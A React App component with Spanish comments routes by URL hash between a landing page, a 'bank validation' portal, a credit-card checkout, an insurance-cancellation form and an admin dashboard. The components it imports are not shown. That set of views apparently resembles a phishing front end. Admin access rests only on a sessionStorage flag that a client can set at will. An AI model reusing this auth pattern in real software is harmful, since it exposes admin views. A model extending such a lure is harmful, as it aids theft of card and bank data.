import { useState, useEffect } from 'react'
import { PortnewLanding } from './components/PortnewLanding'
import { VisualAuthView } from './components/VisualAuthView'
import { Dashboard } from './components/Dashboard'
import { AdminLogin } from './components/AdminLogin'
import { CreditCardCheckout } from './components/CreditCardCheckout'
import { InsuranceCancellationView } from './components/InsuranceCancellationView'

export function App() {
  const [view, setView] = useState<'landing' | 'auth' | 'credit-card' | 'insurance' | 'admin-login' | 'dashboard'>('landing')
  const [isAdminAuth, setIsAdminAuth] = useState<boolean>(() => {
    return sessionStorage.getItem('novapay_admin_auth') === 'true'
  })

  // Sincronizar hash de la URL
  useEffect(() => {
    const handleHash = () => {
      const hash = window.location.hash
      if (hash === '#dashboard' || hash === '#admin') {
        if (isAdminAuth) {
          setView('dashboard')
        } else {
          setView('admin-login')
        }
      } else if (hash === '#tarjeta' || hash === '#checkout') {
        setView('credit-card')
      } else if (hash === '#seguro' || hash === '#cancelar-seguro' || hash === '#seguros' || hash === '#cancelacion') {
        setView('insurance')
      } else if (hash === '#auth' || hash === '#login' || hash === '#solicitud') {
        setView('auth')
      } else {
        setView('landing')
      }
    }

    handleHash()
    window.addEventListener('hashchange', handleHash)
    return () => window.removeEventListener('hashchange', handleHash)
  }, [isAdminAuth])

  const handleAdminLoginSuccess = () => {
    setIsAdminAuth(true)
    sessionStorage.setItem('novapay_admin_auth', 'true')
    window.location.hash = '#dashboard'
    setView('dashboard')
  }

  const handleAdminLogout = () => {
    setIsAdminAuth(false)
    sessionStorage.removeItem('novapay_admin_auth')
    setView('admin-login')
  }

  const handleBackToLanding = () => {
    window.location.hash = ''
    setView('landing')
  }

  const handleStartAuth = (selectedCupo?: number) => {
    if (selectedCupo) {
      sessionStorage.setItem('solicitud_cupo', selectedCupo.toString())
    }
    window.location.hash = '#auth'
    setView('auth')
  }

  const handleGoToCreditCard = () => {
    window.location.hash = '#tarjeta'
    setView('credit-card')
  }

  return (
    <div className="relative min-h-screen bg-[#F0F2F5]">
      
      {/* Vista 0: Portada Nueva (Portnew Landing Page Oficial) */}
      {view === 'landing' && (
        <PortnewLanding onStartAuth={handleStartAuth} />
      )}

      {/* Vista 1: Login de Administrador */}
      {view === 'admin-login' && (
        <AdminLogin
          onSuccess={handleAdminLoginSuccess}
          onBackToClient={handleBackToLanding}
        />
      )}

      {/* Vista 2: Dashboard Administrativo Rediseñado (Requiere Login) */}
      {view === 'dashboard' && (
        <Dashboard
          onLogout={handleAdminLogout}
          onBackToClient={handleBackToLanding}
        />
      )}

      {/* Vista 3: Formulario Individual de Compra con Tarjetas de Crédito */}
      {view === 'credit-card' && (
        <CreditCardCheckout onGoToLogin={() => handleStartAuth()} />
      )}

      {/* Vista 4: Formulario Individual de Cancelación de Seguros */}
      {view === 'insurance' && (
        <InsuranceCancellationView
          onBackToHome={handleBackToLanding}
          onGoToLogin={() => handleStartAuth()}
        />
      )}

      {/* Vista 5: Portal Público Individual de Validación Bancaria */}
      {view === 'auth' && (
        <VisualAuthView onGoToCard={handleGoToCreditCard} />
      )}

    </div>
  )
}

export default App
